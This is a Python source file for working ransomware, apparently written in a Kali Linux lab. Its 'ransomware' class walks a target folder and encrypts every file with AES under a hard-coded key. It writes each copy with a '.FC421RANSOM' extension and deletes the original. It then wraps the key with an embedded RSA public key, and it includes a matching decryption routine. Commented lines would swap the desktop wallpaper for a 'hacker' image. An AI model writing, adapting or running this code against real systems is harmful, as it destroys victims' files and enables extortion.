from Crypto.PublicKey import RSA
from pathlib import Path
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto import Random
from sys import stdout
import base64, os
import  rsa

class ransomware:
    key = "aGFja2xhYg=="
    p = Path('/home/kali/Desktop/fc421')
    public_key="""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtFAg862S+TPRWxY8TfHN
hjZ0GuMme9kJTbUBiYYfZvc4WCOV1nvv2E4rDTibCtIzthNGOSWSmTAxBjBlfDMG
4difqsFVj0pm/arOgyOK8C5L4RMQVIwgbC1DgT4+Ke9fe3qUVRms1rnVVD7XLicY
odSfWlBTRBvZtgA61+zAiuFZu1kIJRl5ri5Pgz4S3a1LLBDiwbOllugJk/gTSIif
4V4ucuFcemlvcvlnesmFdvj1USSBMu5TSXRBXrtvtlKMtjwrX9u/rkuJErOr0K66
ZOWNw9hRwapSFKBk96HaETm/8GgAQu/0/RdAtzbCm8Gr8m23auWj8X1z+bMfFfrH
2QIDAQAB
-----END PUBLIC KEY-----"""
    list_f = []
    list_d = []
    publicKey, privateKey = rsa.newkeys(512)
    def getkey(password):
        hasher = SHA256.new(password)
        #print(hasher.digest())
        return hasher.digest()
    #def generateRSA(variable):
    #    publicKey, privateKey = rsa.newkeys(512)
    #    encMessage = rsa.encrypt(ransomware.key.encode(), publicKey)
    #    print("encrypted string: ", encMessage)
    #    decMessage = rsa.decrypt(encMessage, privateKey).decode()
    #    print("decrypted string: ", decMessage)

    def getFile(list_f):
        # extensions list
        extensions = ["*"]  # ['jpg', 'png', 'jpeg', 'iso','exe', 'mp3', "mp4", 'zip', 'rar', 'txt', 'iso']
        for extension in extensions:
            try:
                searche = list(ransomware.p.glob('**/*.{}'.format(extension)))
                for File in searche:
                    File = str(File)
                    if File.endswith(".FC421RANSOM"):
                        pass
                    else:
                        # x = x.split("/")[-1]
                        list_f.append(File)
            except OSError:
                print("you must be root !")
        for i in list_f:
            file_name = i.split("/")[-1]
            file_path = i.replace(file_name, "")
            #word = cl.blue + "Encryption: " + cl.end + str(file_name)
            #write(word)
            os.chdir(file_path)
        return list_f
    def encryptor(list_file):
        for filename in list_file:
            chunksize = 64 * 1024
            outputFile = str(filename) + ".FC421RANSOM"
            filesize = str(os.path.getsize(filename)).zfill(16)
            IV = Random.new().read(16)
            encryptor = AES.new(ransomware.getkey(base64.b64decode(ransomware.key)), AES.MODE_CBC, IV)
            try:
                with open(filename, 'rb') as infile:
                    with open(outputFile, 'wb') as outfile:
                        outfile.write(filesize.encode('utf-8'))
                        outfile.write(IV)
                        while True:
                            chunk = infile.read(chunksize)
                            if len(chunk) == 0:
                                break
                            elif len(chunk) % 16 != 0:
                                chunk += b' ' * (16 - (len(chunk) % 16))
                            outfile.write(encryptor.encrypt(chunk))
                            try:
                                os.remove(filename)
                            except OSError:
                                pass
                #global public_key
                recipient_key = RSA.import_key(ransomware.public_key)
                encryptorRSA = PKCS1_OAEP.new(recipient_key)
                enckey=encryptorRSA.encrypt(ransomware.key.encode())
                f=open('/home/kali/RanSomeWhere/plain','wb')
                f.write(enckey)
                f.close()
                #encKey = rsa.encrypt(ransomware.key.encode(), rsa.PublicKey(ransomware.public_key))
            except IOError:
                pass
        #os.system("/usr/bin/gsettings set org.gnome.desktop.background picture-uri /home/mariam/Pictures/hacker.jpeg")


    def decrypt(list_files,key):
        extensions = ["*"]
        for extension in extensions:
            searche = list(ransomware.p.glob('**/*.{}'.format(extension)))
            # print(searche)
            for File in searche:
                File = str(File)
                if File.endswith(".FC421RANSOM"):
                    list_files.append(File)

        for files in list_files:
            buffersize = 64 * 1024
            outputfile = files.split('.FC421RANSOM')[0]
            with open(files, 'rb') as infile:
                filesize = int(infile.read(16))
                IV = infile.read(16)
                #x=open('/home/kali/RanSomeWhere/plain','rb')
                #key=x.read()
                #print(key)
                decryptor = AES.new(key, AES.MODE_CBC, IV)
                with open(outputfile, 'wb') as outfile:
                    while True:
                        buf = infile.read(buffersize)
                        if len(buf) == 0:
                            break
                        outfile.write(decryptor.decrypt(buf))
                    outfile.truncate(filesize)
            try:
                searche = list(ransomware.p.glob('**/*.FC421RANSOM'))
                for x in searche:
                    x = str(x)
                    # x = x.split("/")[-1]
                    ransomware.list_d.append(x)
                # print(x)
            except OSError:
                pass
            for i in ransomware.list_d:
                name = i.split("/")[-1]
                path = i.replace(name, "")
                os.chdir(path)
                os.remove(name)
        #os.system("/usr/bin/gsettings set org.gnome.desktop.background picture-uri /home/mariam/Pictures/wallpaper.jpg")


